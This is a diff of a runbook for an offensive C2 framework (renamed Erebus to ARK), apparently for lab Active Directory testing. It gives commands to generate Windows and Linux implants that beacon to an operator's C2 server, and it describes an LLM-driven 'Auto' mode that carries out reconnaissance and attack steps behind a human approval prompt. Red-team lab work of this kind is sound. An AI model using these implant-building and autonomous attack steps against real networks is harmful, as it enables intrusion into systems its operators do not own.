@@ -18,9 +18,9 @@
 | Domain FQDN | e.g. `sevenkingdoms.local` |
 | DC hostname | e.g. `kingslanding.sevenkingdoms.local` |
 | Domain user for bind (if needed) | |
-| C2 listener URL | `https://<teamserver>:443` (reachable from implant host) |
+| C2 listener URL | `https://<teamserver>:1750` (fresh default; 8443 if `server.yaml` says so) |
 | Implant host | Domain-joined Windows workstation |
-| Operator machine | Teamserver + `erebus` CLI |
+| Operator machine | Teamserver + `ark` CLI |
 | LLM | Hosted Claude/GPT recommended (`ai setup`) |
 
 ---
@@ -29,13 +29,13 @@
 
 ```bash
 # On operator machine
-cd /path/to/Erebus
-make erebus install   # or: make erebus && ./build/erebus
+cd /path/to/ARK
+make ark install   # or: make ark && ./build/ark
 
-erebus teamserver     # C2 daemon (certs under ~/.erebus/certs/). Not `serve` — REPL EOF used to kill C2.
+ark teamserver     # C2 daemon (certs under ~/.ark/certs/). `serve` now survives REPL EOF/`exit`; Ctrl+C still stops it. Prefer teamserver for detached HTB.
 # Separate terminal:
-cp config/agent.yaml.example ~/.erebus/agent.yaml   # optional
-# Ensure approver.pem exists (erebus certs seats / teamserver)
+cp config/agent.yaml.example ~/.ark/agent.yaml   # optional
+# Ensure approver.pem exists (ark certs seats / teamserver)
 ```
 
 ### Build Windows implant (C primary; interactive sleep)
@@ -43,15 +43,15 @@ cp config/agent.yaml.example ~/.erebus/agent.yaml   # optional
 ```bash
 # From operator REPL after serve (default language is c for Windows PE):
 generate --os windows --arch amd64 --sleep 500 --jitter 10 \
-  --callback https://YOUR_C2:443 --out ./implant.exe
+  --callback https://YOUR_C2:1750 --out ./implant.exe
 # Explicit: --language c
-# Linux primary: --language c --os linux  (Go Linux is fallback only)
+# Linux: --language c --os linux  (Go Linux is archived)
 
 # Or make:
-make implant-c CALLBACK_URL=https://YOUR_C2:443 SLEEP_MS=500 JITTER_PCT=10
+make implant-c CALLBACK_URL=https://YOUR_C2:1750 SLEEP_MS=500 JITTER_PCT=10
 # Linux:
 make implant-c-linux CALLBACK_URL=https://YOUR_C2:8443 \
-  CA_CERT_PATH=$HOME/.erebus/ca-cert.pem SLEEP_MS=500
+  CA_CERT_PATH=$HOME/.ark/ca-cert.pem SLEEP_MS=500
 ```
 
 Copy `implant.exe` / `implant_c.exe` to domain host and run (authorized lab only).  
@@ -62,7 +62,7 @@ Linux: drop `build/implant_c_linux` (see `docs/plans/SPRINT_L_C_LINUX.md`).
 ## Manual path (prove once before Auto)
 
 ```text
-erebus operator
+ark operator
 sessions
 use <session-id>
 shell whoami
@@ -82,8 +82,8 @@ If any step fails, capture error text before Auto.
 ## AI path (Plan → Auto)
 
 ```text
-erebus
-erebus › ai
+ark
+ark › ai
 
 # Shift+Tab until Plan is active
 # Paste frozen objective, wait for structured plan (no implant tasks)
@@ -108,7 +108,7 @@ Keys:
 
 ## Demo video beats (~6–8 min)
 
-1. Banner + `erebus teamserver` / session appears  
+1. Banner + `ark teamserver` / session appears  
 2. Plan mode → structured path  
 3. Auto → recon tools stream  
 4. Approval modal → press **a**  
@@ -136,7 +136,7 @@ Use `scripts/golden_ad_eval.md` checklist. Record pass/fail per run.
 
 | Symptom | Check |
 |---------|--------|
-| Auto unavailable | `~/.erebus/certs/operator.pem` + `approver.pem`; teamserver up |
+| Auto unavailable | `~/.ark/certs/operator.pem` + `approver.pem`; teamserver up |
 | Task slow again | Implant sleep; server should not force 5s (P0 fix) |
 | LDAP fail | Domain/DC names; network from implant to DC:389/88 |
 | Approval hang | Approver cert present; press `a` not second terminal |
